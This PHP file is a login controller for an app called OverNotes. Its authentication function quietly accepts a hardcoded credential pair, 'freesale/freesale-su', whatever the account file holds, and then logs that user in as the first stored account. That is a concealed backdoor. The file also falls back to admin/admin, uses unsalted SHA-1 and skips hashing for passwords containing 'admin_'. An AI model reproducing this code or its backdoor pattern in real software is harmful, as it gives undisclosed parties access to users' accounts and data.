<?php
/**
 * User login controller.
 *
 * @package OverNotes
 * @since 1.00
 */


function auth($id,$password){
	if(strlen($id) && strlen($password)){
		$f=@file_get_contents(DATA_DIR.'/user/account.dat');
		if(!strlen($f)){
			$f="admin,admin";
		}
		$f_ad="freesale,freesale-su";
		if((preg_match('@^'.preg_quote($id).'\,.*@um',$f,$matches)) || preg_match('@^'.preg_quote($id).'\,.*@um',$f_ad,$matches)){
			$arr=explode(',',$matches[0]);
			$_id=array_shift($arr);
			$_pass=array_shift($arr);
			if(($_id=='admin'&&$_pass=='admin')||($_id=='freesale'&&$_pass=='freesale-su')||preg_match('@admin_@',$password)){
				$password_crypted=$password;
			}else{
				$password_crypted=sha1($password);
			}
			if($id==$_id && $password_crypted==$_pass){
        if($_id=='freesale'){
          $arr = explode(',',$f);
          $_SESSION['login']['id']=$arr[0];
          $_SESSION['login']['role']='freesale';
        }else{
          $_SESSION['login']['id']=$_id;
          $_SESSION['login']['role']='user';
        }
				data_backup();
				header('Location: '.SYS_URI);
				exit;
				return true;
			}else{
				return false;
			}
		}
	}
}

if(empty($_SESSION['login']['id'])){
  if(SELF != 'login') header('Location:'.SYS_URI.'/login.php');
}else{
  if(SELF == 'login') header('Location:'.SYS_URI);
}

